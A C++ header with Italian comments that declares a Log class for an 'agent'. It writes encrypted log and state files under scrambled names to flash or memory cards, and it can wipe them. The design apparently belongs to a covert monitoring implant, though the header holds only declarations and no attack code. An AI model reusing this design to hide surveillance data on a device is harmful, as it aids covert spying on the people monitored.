#include "Common.h"
#include "Encryption.h"
#include "UberLog.h"
#include <exception>
#include <vector>
#include <string.h>
using namespace std;

#ifndef __Log_h__
#define __Log_h__

/*			LOG FORMAT
 *
 *  -- Naming Convention
 *	Il formato dei log e' il seguente:
 *	Il nome del file in chiaro ha questa forma: ID_AGENTE-TIMESTAMP_64BIT.mob
 *	e si presenta cosi': xxxxtttttttt.mob
 *	Il primo gruppo e' formato da 4 cifre esadecimali, il secondo e' formato da
 *	un timestamp a 64 bit diviso in due parti a 32-bit, la prima e' il LowPart del
 *  timestamp, la seconda e' l'HighPart del timestamp (l'ordine e' stato impostato cosi'
 *  per evitare alcuni problemi con i nomi sulla FAT-16). Il nome del file viene 
 *  scramblato con il primo byte della	chiave utilizzata per il challenge.
 *
 *  -- Pre-Header
 *  Una DWORD  in chiaro che indica la lunghezza dell'header (inclusi gli ID e 
 *  l'AdditionalData) paddata a 16.
 *
 *	-- Header
 *	Il log cifrato e' cosi' composto:
 *	all'inizio del file viene scritta una LogStruct. Dopo la LogStruct troviamo gli ID
 *  quindi i byte di AdditionalData se presenti e poi il contenuto vero e proprio.
 *
 *	-- Data
 *	Il contenuto e' formato da una DWORD in chiaro che indica la dimensione del blocco
 *	unpadded (va quindi paddata a BLOCK_SIZE per ottenere la lunghezza del blocco cifrato)
 *	e poi il blocco di dati vero e proprio. Questa struttura puo' esser ripetuta fino alla
 *	fine del file.
 *
 *	-- Global Struct
 *	|DWORD|Log Struct|IDs|AdditionalData|DWORD Unpadded|Block|.....|DWORD Unpadded|Block|.....|
 *
 *	Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
 *
 */

class Log
{
	/**
	 * Rappresenta il nome in chiaro del file di log, va deallocato dal distruttore.
	 */
	private: wstring strLogName;
	private: HANDLE hFile;
	private: Encryption encryptionObj;
	private: UberLog *uberlogObj;
	private: UINT uLogType;
	private: UINT uStoredToMmc;
	private: BOOL bEmpty;

	/**
	 * Genera un nome gia' scramblato per un file log, se bAddPath e' TRUE il nome ritornato
	 * e' completo del path da utilizzare altrimenti viene ritornato soltanto il nome. 
	 * Se la chiamata fallisce la funzione torna una stringa vuota. Il nome generato
	 * non indica necessariamente un file che gia' non esiste sul filesystem, e' compito del chiamante
	 * verificare che tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC e'
	 * impostato a TRUE viene generato un nome che punta alla prima MMC disponibile, se esiste.
	 */
	private: wstring MakeName(WCHAR *wName, BOOL bAddPath, UINT uStoreToMMC = FLASH);

	 /**
	 * Override della funzione precedente: invece di generare il nome da una stringa lo genera
	 * da un numero. Se la chiamata fallisce la funzione torna una stringa vuota.
	 */
	private: wstring MakeName(UINT uAgentId, BOOL bAddPath);

	/**
	* Genera un nome gia' scramblato per un file di Markup, se bAddPath e' TRUE il nome ritornato
	* e' completo del path da utilizzare altrimenti viene ritornato soltanto il nome. Se la chiamata 
	* fallisce la funzione torna una stringa vuota. Il nome generato
	* non indica necessariamente un file che gia' non esiste sul filesystem, e' compito del chiamante
	* verificare che tale file non sia gia' presente. Se il parametro facoltativo bStoreToMMC e'
	* impostato a TRUE viene generato un nome che punta alla prima MMC disponibile, se esiste.
	*/
	private: wstring MakeMarkupName(wstring &strMarkupName, BOOL bAddPath, BOOL bStoreToMMC = FALSE);

	/**
	* Override della funzione precedente: invece di generare il nome da una stringa lo genera
	* da un numero. Se la chiamata fallisce la funzione torna una stringa vuota.
	*/
	private: wstring MakeMarkupName(UINT uAgentId, BOOL bAddPath);

	/**
	 * Questa funzione crea un file di log e lascia l'handle aperto. Il file viene creato con
	 * un nome casuale, la chiamata scrive l'header nel file e poi i dati addizionali se ce ne
	 * sono. LogType e' il tipo di log che stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
	 * additional data e uAdditionalLen e la lunghezza dei dati addizionali da scrivere nell'header. 
	 * Il parametro facoltativo uStoreToMMC se settato a MMC1 o MMC2 lo stora rispettivamente nella
	 * prima e seconda Memory Card, se non c'e' la relativa scheda, la chiamata fallisce. Se il parametro
	 * viene impostato a FLASH il file viene storato nella memoria interna.
	 * La funzione torna TRUE se va a buon fine, FALSE altrimenti.
	 */
	public: BOOL CreateLog(UINT LogType, BYTE* pAdditionalData, UINT uAdditionalLen, UINT uStoreToMMC);

	/**
	 * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel file di log creato
	 * con CreateLog(). La funzione torna TRUE se va a buon fine, FALSE altrimenti.
	 */
	public: BOOL WriteLog(BYTE* pByte, UINT uLen);

	/**
	 * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
	 * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
	 * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va chiamata per i
	 * markup perche' la WriteMarkup() e la ReadMarkup() chiudono automaticamente l'handle.
	 */
	public: BOOL CloseLog(BOOL bRemove = FALSE);

	/**
	 * Crea un log di tipo LOGTYPE_INFO e scrive al suo interno il contenuto di strData. Torna
	 * TRUE se la creazione e scrittura vanno a buon fine, FALSE altrimenti. In caso di fallimento
	 * il log viene rimosso dal disco e dalla coda. Il log viene chiuso al termine della chiamata
	 * quindi non c'e' bisogno di chiamare la CloseLog();
	 */
	public: BOOL WriteLogInfo(wstring &strData);
	public: BOOL WriteLogInfo(WCHAR* wstrData);

	/**
	 * Scrive un file di markup per salvare lo stato dell'agente, i parametri utilizzati sono: l'ID dell'agente
	 * che sta generando il file, il puntatore al buffer dati e la lunghezza del buffer. Al termine della
	 * scrittura il file viene chiuso, non e' possibile fare alcuna Append e un'ulteriore chiamata alla
	 * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La funzione torna TRUE se e' andata
	 * a buon fine, FALSE altrimenti. Il contenuto scritto e' cifrato.
	 */
	public: BOOL WriteMarkup(UINT uAgentId, BYTE *pData, UINT uLen);

	/**
	 * Legge il file di markup specificato da uAgentId (l'ID dell'agente che l'ha generato), torna un puntatore
	 * ai dati decifrati che va poi liberato dal chiamante e dentro uLen la lunghezza dei byte validi nel blocco. 
	 * Se il file non viene trovato o non e' possibile decifrarlo correttamente la funzione torna NULL.
	 * La funzione torna NULL anche se il Markup e' vuoto. E' possibile creare dei markup vuoti, in questo caso
	 * non va usata la ReadMarkup() ma semplicemente la IsMarkup() per vedere se e' presente o meno.
	 */
	public: BYTE* ReadMarkup(UINT uAgentId, UINT *uLen);

	/**
	 * Torna TRUE se esiste un markup per l'agent uAgentId, altrimenti torna FALSE.
	 */
	public: BOOL IsMarkup(UINT uAgentId);

	/**
	 * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna TRUE se il file e' stato
	 * rimosso o non e' stato trovato, FALSE se non e' stato possibile rimuoverlo.
	 */
	public: BOOL RemoveMarkup(UINT uAgentId);

	/**
	 * Rimuove tutti i file di markup presenti sul filesystem.
	 */
	public: void RemoveMarkups();
	 
	/**
	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
	 */
	public: void RemoveLogDirs();

	/**
	 * Torna TRUE se il log e' vuoto, FALSE altrimenti.
	 */
	public: BOOL IsEmpty();

	Log();
	~Log();
};

#endif
